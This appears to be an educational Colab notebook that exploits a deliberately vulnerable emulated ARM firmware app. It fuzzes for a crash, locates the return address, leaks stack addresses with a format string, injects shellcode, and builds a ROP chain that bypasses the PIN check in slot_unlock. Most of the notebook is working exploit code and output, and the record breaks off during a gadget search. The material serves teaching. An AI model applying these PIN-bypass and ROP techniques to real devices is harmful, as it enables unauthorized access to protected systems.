{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOXh/mtEBCY5T89roSIyisy",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Jubicod/wsf/blob/main/tutorial1/help/d_buffer_overflow.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Exploiting a **buffer overflow**"
      ],
      "metadata": {
        "id": "Jso6XDC9GaX0"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "C1KTz7tAGQHR",
        "outputId": "bdc2a63c-5834-4282-878a-f194d7c8b415"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'wsf'...\n",
            "remote: Enumerating objects: 254, done.\u001b[K\n",
            "remote: Counting objects: 100% (254/254), done.\u001b[K\n",
            "remote: Compressing objects: 100% (177/177), done.\u001b[K\n",
            "remote: Total 254 (delta 102), reused 187 (delta 69), pack-reused 0\u001b[K\n",
            "Receiving objects: 100% (254/254), 177.87 KiB | 1.43 MiB/s, done.\n",
            "Resolving deltas: 100% (102/102), done.\n",
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "The following additional packages will be installed:\n",
            "  binutils-arm-none-eabi libnewlib-arm-none-eabi libnewlib-dev libstdc++-arm-none-eabi-dev\n",
            "  libstdc++-arm-none-eabi-newlib\n",
            "Suggested packages:\n",
            "  libnewlib-doc\n",
            "The following NEW packages will be installed:\n",
            "  binutils-arm-none-eabi gcc-arm-none-eabi libnewlib-arm-none-eabi libnewlib-dev\n",
            "  libstdc++-arm-none-eabi-dev libstdc++-arm-none-eabi-newlib\n",
            "0 upgraded, 6 newly installed, 0 to remove and 45 not upgraded.\n",
            "Need to get 442 MB of archives.\n",
            "After this operation, 2,575 MB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/universe amd64 binutils-arm-none-eabi amd64 2.38-3ubuntu1+15build1 [3,040 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu jammy/universe amd64 gcc-arm-none-eabi amd64 15:10.3-2021.07-4 [47.7 MB]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libstdc++-arm-none-eabi-dev all 15:10.3-2021.07-4+17 [1,049 kB]\n",
            "Get:4 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libnewlib-dev all 3.3.0-1.3 [137 kB]\n",
            "Get:5 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libnewlib-arm-none-eabi all 3.3.0-1.3 [43.2 MB]\n",
            "Get:6 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libstdc++-arm-none-eabi-newlib all 15:10.3-2021.07-4+17 [347 MB]\n",
            "Fetched 442 MB in 12s (36.2 MB/s)\n",
            "Selecting previously unselected package binutils-arm-none-eabi.\n",
            "(Reading database ... 121752 files and directories currently installed.)\n",
            "Preparing to unpack .../0-binutils-arm-none-eabi_2.38-3ubuntu1+15build1_amd64.deb ...\n",
            "Unpacking binutils-arm-none-eabi (2.38-3ubuntu1+15build1) ...\n",
            "Selecting previously unselected package gcc-arm-none-eabi.\n",
            "Preparing to unpack .../1-gcc-arm-none-eabi_15%3a10.3-2021.07-4_amd64.deb ...\n",
            "Unpacking gcc-arm-none-eabi (15:10.3-2021.07-4) ...\n",
            "Selecting previously unselected package libstdc++-arm-none-eabi-dev.\n",
            "Preparing to unpack .../2-libstdc++-arm-none-eabi-dev_15%3a10.3-2021.07-4+17_all.deb ...\n",
            "Unpacking libstdc++-arm-none-eabi-dev (15:10.3-2021.07-4+17) ...\n",
            "Selecting previously unselected package libnewlib-dev.\n",
            "Preparing to unpack .../3-libnewlib-dev_3.3.0-1.3_all.deb ...\n",
            "Unpacking libnewlib-dev (3.3.0-1.3) ...\n",
            "Selecting previously unselected package libnewlib-arm-none-eabi.\n",
            "Preparing to unpack .../4-libnewlib-arm-none-eabi_3.3.0-1.3_all.deb ...\n",
            "Unpacking libnewlib-arm-none-eabi (3.3.0-1.3) ...\n",
            "Selecting previously unselected package libstdc++-arm-none-eabi-newlib.\n",
            "Preparing to unpack .../5-libstdc++-arm-none-eabi-newlib_15%3a10.3-2021.07-4+17_all.deb ...\n",
            "Unpacking libstdc++-arm-none-eabi-newlib (15:10.3-2021.07-4+17) ...\n",
            "Setting up binutils-arm-none-eabi (2.38-3ubuntu1+15build1) ...\n",
            "Setting up gcc-arm-none-eabi (15:10.3-2021.07-4) ...\n",
            "Setting up libnewlib-dev (3.3.0-1.3) ...\n",
            "Setting up libnewlib-arm-none-eabi (3.3.0-1.3) ...\n",
            "Setting up libstdc++-arm-none-eabi-dev (15:10.3-2021.07-4+17) ...\n",
            "Setting up libstdc++-arm-none-eabi-newlib (15:10.3-2021.07-4+17) ...\n",
            "Processing triggers for man-db (2.10.2-1) ...\n",
            "Processing triggers for libc-bin (2.35-0ubuntu3.4) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_0.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbb.so.12 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc_proxy.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_5.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind.so.3 is not a symbolic link\n",
            "\n",
            "Collecting unicorn\n",
            "  Downloading unicorn-2.0.1.post1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (16.1 MB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m16.1/16.1 MB\u001b[0m \u001b[31m69.4 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: unicorn\n",
            "Successfully installed unicorn-2.0.1.post1\n",
            "Collecting lief\n",
            "  Downloading lief-0.14.1-cp310-cp310-manylinux_2_28_x86_64.manylinux_2_27_x86_64.whl (2.7 MB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.7/2.7 MB\u001b[0m \u001b[31m22.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: lief\n",
            "Successfully installed lief-0.14.1\n",
            "make: Entering directory '/content/wsf/tutorial1/app'\n",
            "arm-none-eabi-gcc -O1 -g -march=armv7-m startup_stm32f10x_ld.s main.c slots.c --specs=nosys.specs -T stm32_flash.ld -o app.elf\n",
            "arm-none-eabi-objdump -S app.elf > app.txt\n",
            "arm-none-eabi-objdump -x app.elf > app.map\n",
            "make: Leaving directory '/content/wsf/tutorial1/app'\n"
          ]
        }
      ],
      "source": [
        "!git clone https://github.com/Jubicod/wsf.git\n",
        "%run wsf/tutorial1/install.ipynb"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "app = App()\n",
        "# to find a buffer overflow, we just send a lot of bytes on different commands and see what happens\n",
        "app.send('UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vaApFcUVGhRM",
        "outputId": "931dd257-8abc-48b4-a960-1854ab8f5875"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n",
            "error\n",
            "------CRASHED--------\n",
            "Unhandled CPU exception (UC_ERR_EXCEPTION)\n",
            "PC = 0x41414140\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "965"
            ]
          },
          "metadata": {},
          "execution_count": 2
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# the crash is probably the symptom of a buffer overflow. the crash dump seems to indicate an overflow of the program counter (return address on stack)\n",
        "# is it only on command U ?\n",
        "# in fact we can try a lot of commands, all crash, it is not related to a command as shown below\n",
        "app.reset()\n",
        "app.send('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hfqVIycUHs5Y",
        "outputId": "c22dc1d1-8a8a-4a3b-885b-360cee9f3f18"
      },
      "execution_count": 20,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Unhandled CPU exception (UC_ERR_EXCEPTION)\n",
            "PC = 0x41414140\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "596"
            ]
          },
          "metadata": {},
          "execution_count": 20
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# since we have this very convenient crash dump, let's find out where is the return address to overwrite\n",
        "app.reset()\n",
        "app.send('0000111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEE')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Chl5Dhb0IMvt",
        "outputId": "651972ca-169b-4ae6-97c6-6cf2f8f3c226"
      },
      "execution_count": 21,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "0000111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEE\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)\n",
            "PC = 0x34343434\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "590"
            ]
          },
          "metadata": {},
          "execution_count": 21
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# PC is 0x34343434 ('4444'), so return address is on the 5th 32-bits word of our buffer\n",
        "# how to go further ?\n",
        "# here we assume we don't have yet the code binary, but we know another bug exists: a format string\n",
        "app.reset()\n",
        "app.send('%p-%p-%p-%p-%p-%p-%p-%p-%p')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CPodyqXPI-ac",
        "outputId": "3f02ebaa-4b48-4ec4-a40d-11b75cb147ac"
      },
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "20004fe0-20000a28-0-0-0-0-0-0-8000267\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)\n",
            "PC = 0x70252d70\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "386"
            ]
          },
          "metadata": {},
          "execution_count": 22
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# we have to very different addresses in RAM. one is probably on the stack, the other one on globals\n",
        "# the first one is probably the stack, as it is very often on a top address\n",
        "# let's try to fill our buffer with infinite loops (opcode e7fe)\n",
        "# and jump to this stack address (with bit 0 set to 1 to indicate ARM Thumb code)\n",
        "app.reset()\n",
        "app.send(0xe7fee7fe, 0xe7fee7fe, 0xe7fee7fe, 0xe7fee7fe, 0x20004fe1)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 174
        },
        "id": "s42a73PHJvra",
        "outputId": "7e9b39eb-3fd6-410c-fe71-075193a911e3"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "þçþçþçþçþçþçþçþçáO\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'timeout'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 6
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# it worked (1s timeout). it was the address of our buffer\n",
        "# and RAM is executable on this device\n",
        "# now we can just insert our binary code in the buffer\n",
        "# but what if the RAM was not executable ?\n",
        "app = App(RAM_is_executable=False) # power-up the device with RAM not executable\n",
        "app.reset()\n",
        "app.send(0xe7fee7fe, 0xe7fee7fe, 0xe7fee7fe, 0xe7fee7fe, 0x20004fe1)\n",
        "# it does not work anymore !!!"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zcgRjvEyKphY",
        "outputId": "6ec9c093-efc5-4c51-8834-2d2a1b370f25"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "þçþçþçþçþçþçþçþçáO\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Fetch from non-executable memory (UC_ERR_FETCH_PROT)\n",
            "PC = 0x20004fe0\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "350"
            ]
          },
          "metadata": {},
          "execution_count": 8
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Code Reuse, white box hacking\n",
        "\n",
        "we can try code reuse techniques, but for these, it's much easier with the binary.\n",
        "\n",
        "Let's assume we dumped it (thanks to the format string bug for instance) and reversed it.\n",
        "\n",
        "The disassembly file is in app/app.txt\n",
        "\n",
        "Now let's try to unlock the device. Here is the slot_unlock function\n",
        "\n",
        "```\n",
        "void slot_unlock(unsigned char* pw, int size)\n",
        "{\n",
        " 8000384:\tb508      \tpush\t{r3, lr}\n",
        " 8000386:\t4601      \tmov\tr1, r0\n",
        " 8000388:\t2204      \tmovs\tr2, #4\n",
        " 800038a:\t4807      \tldr\tr0, [pc, #28]\t; (80003a8 <slot_unlock+0x24>)\n",
        " 800038c:\tf000 f950 \tbl\t8000630 <memcmp>\n",
        " 8000390:\tb920      \tcbnz\tr0, 800039c <slot_unlock+0x18>\n",
        "  info.locked = 0;\n",
        " 8000392:\t4b06      \tldr\tr3, [pc, #24]\t; (80003ac <slot_unlock+0x28>)\n",
        " 8000394:\t2200      \tmovs\tr2, #0\n",
        " 8000396:\t701a      \tstrb\tr2, [r3, #0]\n",
        "\tinfo.error = 0;\n",
        " 8000398:\t705a      \tstrb\tr2, [r3, #1]\n",
        " 800039a:\tbd08      \tpop\t{r3, pc}\n",
        "```\n",
        "We can jump after PIN is verified, to 0x08000392.\n",
        "\n",
        "But for this to be useful we need to recover from the crash, to accept read and write commands for instance. The function returns with POP {R3,PC}, so we could return in the main loop (in main), just before the \"ready\" print (0x08000286):\n",
        "\n",
        "```\n",
        "int main(int argc, char**argv)\n",
        "{\n",
        " 8000284:\tb508      \tpush\t{r3, lr}\n",
        "        printf(\"ready...\\n\");\n",
        " 8000286:\t4803      \tldr\tr0, [pc, #12]\t; (8000294 <main+0x10>)\n",
        " 8000288:\tf000 fabc \tbl\t8000804 <puts>\n",
        "\twhile(1)\n",
        "\t{\n",
        "\t\treceive_and_process_command();\n",
        " 800028c:\tf7ff ffe5 \tbl\t800025a <receive_and_process_command>\n",
        "\twhile(1)\n",
        " 8000290:\te7fc      \tb.n\t800028c <main+0x8>\n",
        " 8000292:\tbf00      \tnop\n",
        " 8000294:\t08007f58 \t.word\t0x08007f58\n",
        "```\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "yf5MaHtvQ0fi"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!grep 'void slot_unlock' wsf/tutorial1/app/app.txt -A 20"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5zNoKasjWPSw",
        "outputId": "5640eacb-cd04-4b14-bbbe-880ab338cd12"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "void slot_unlock(unsigned char* pw, int size)\n",
            "{\n",
            " 8000384:\tb508      \tpush\t{r3, lr}\n",
            " 8000386:\t4601      \tmov\tr1, r0\n",
            "  if(memcmp(info.password, pw, sizeof(info.password)) == 0)\n",
            " 8000388:\t2204      \tmovs\tr2, #4\n",
            " 800038a:\t4807      \tldr\tr0, [pc, #28]\t; (80003a8 <slot_unlock+0x24>)\n",
            " 800038c:\tf000 f950 \tbl\t8000630 <memcmp>\n",
            " 8000390:\tb920      \tcbnz\tr0, 800039c <slot_unlock+0x18>\n",
            "  info.locked = 0;\n",
            " 8000392:\t4b06      \tldr\tr3, [pc, #24]\t; (80003ac <slot_unlock+0x28>)\n",
            " 8000394:\t2200      \tmovs\tr2, #0\n",
            " 8000396:\t701a      \tstrb\tr2, [r3, #0]\n",
            "\tinfo.error = 0;\n",
            " 8000398:\t705a      \tstrb\tr2, [r3, #1]\n",
            "  else\n",
            "  {\n",
            "    lock();\n",
            "    set_error();\n",
            "  }\n",
            "}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!grep 'int main' wsf/tutorial1/app/app.txt -A 12"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qZwIvdv2WSMl",
        "outputId": "a6d1e05f-de65-4366-9ba2-82e2ebc6a531"
      },
      "execution_count": 28,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "int main(int argc, char**argv)\n",
            "{\n",
            " 8000284:\tb508      \tpush\t{r3, lr}\n",
            "        printf(\"ready...\\n\");\n",
            " 8000286:\t4803      \tldr\tr0, [pc, #12]\t; (8000294 <main+0x10>)\n",
            " 8000288:\tf000 fabc \tbl\t8000804 <puts>\n",
            "\twhile(1)\n",
            "\t{\n",
            "\t\treceive_and_process_command();\n",
            " 800028c:\tf7ff ffe5 \tbl\t800025a <receive_and_process_command>\n",
            "\twhile(1)\n",
            " 8000290:\te7fc      \tb.n\t800028c <main+0x8>\n",
            " 8000292:\tbf00      \tnop\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# let's do it\n",
        "app.reset()\n",
        "app.send('0000111122223333', # don't care\n",
        "         0x08000393, # return to slot_unlock\n",
        "         'AAAA', # POP R3 don't care\n",
        "         0x08000287, # POP PC : return to main loop\n",
        "         )\n",
        "app.send('S')\n",
        "# device is unlocked and still alive !!!!"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KVD1feXwTz50",
        "outputId": "f067f383-bd86-4c8d-dc6b-f90aac625915"
      },
      "execution_count": 12,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "0000111122223333\u0003\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "ready...\n",
            "S\n",
            "device unlocked\n",
            "0  RW-L\n",
            "1  RW-L\n",
            "2  RW-L\n",
            "3  R--L\n",
            "4  R-IL\n",
            "5  RW--\n",
            "6  R---\n",
            "7  ----\n",
            "ok\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "242"
            ]
          },
          "metadata": {},
          "execution_count": 12
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# now let's try to find a way to write anywhere in the memory, to modify all slot contents, or their access rights\n",
        "# ideally we need a write byte gadget\n",
        "!python wsf/tutorial1/scripts/gadget.py -d 2 strb\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "VCh21fdTWx42",
        "outputId": "70bf4c1c-8b00-46b4-bee1-371a2c611328"
      },
      "execution_count": 67,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " 8000168:\t7023      \tstrb\tr3, [r4, #0]\n",
            " 800016a:\tbd10      \tpop\t{r4, pc}\n",
            "\n",
            " 800037c:\t7183      \tstrb\tr3, [r0, #6]\n",
            " 800037e:\tbd10      \tpop\t{r4, pc}\n",
            "\n",
            " 8004dae:\t701e      \tstrb\tr6, [r3, #0]\n",
            " 8004db0:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n",
            " 8004dc8:\t701e      \tstrb\tr6, [r3, #0]\n",
            " 8004dca:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n",
            " 8004e08:\t701d      \tstrb\tr5, [r3, #0]\n",
            " 8004e0a:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n",
            " 8004e24:\t701d      \tstrb\tr5, [r3, #0]\n",
            " 8004e26:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# the strb r5, r3 looks promising (8004e24)\n",
        "# we need a gadget to control r3 and r5:\n",
        "!python wsf/tutorial1/scripts/gadget.py r3 r5\n",
        "# there are a lot (800031a would work)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "bE39r7uuXus7",
        "outputId": "365efeda-1d0a-46ec-80f6-72fb041fbe87"
      },
      "execution_count": 68,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " 8000258:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 800031a:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8001e0c:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8001e2c:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8001ea6:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8003048:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 8003084:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80030b8:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80030d0:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80030d6:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80030ea:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 800311a:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80033ae:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80033d6:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 800399e:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80039dc:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8004338:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 800434c:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8004588:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 800523c:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8005248:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8005272:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8005280:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 800529c:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80052a6:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80060d8:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 8006164:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 800616e:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006234:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 800623e:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80062be:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80062f4:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 800649c:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80064a6:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006554:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 800655e:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80065c0:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 80065ca:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006726:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 800674c:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80067a6:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80067ac:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80067bc:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 80067ce:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 8006a66:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006a8a:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006aa6:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 8006ab0:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 8006ad6:\tbdf8      \tpop\t{r3, r4, r5, r6, r7, pc}\n",
            "\n",
            " 8006b02:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006b1e:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006b22:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006b2c:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006b5c:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006b60:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006b84:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006b88:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006b8e:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006bc2:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006bde:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006be2:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006bec:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006c56:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006c7a:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006cae:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006cb2:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006cd8:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006cdc:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n",
            " 8006ce2:\tbd38      \tpop\t{r3, r4, r5, pc}\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# the difficult part is to exfiltrate the value\n",
        "# printf is not convenient as data should be in r1\n",
        "# we could try to write r0 in the slot 0\n",
        "!python wsf/tutorial1/scripts/gadget.py -d 3 strb\n"
      ],
      "metadata": {
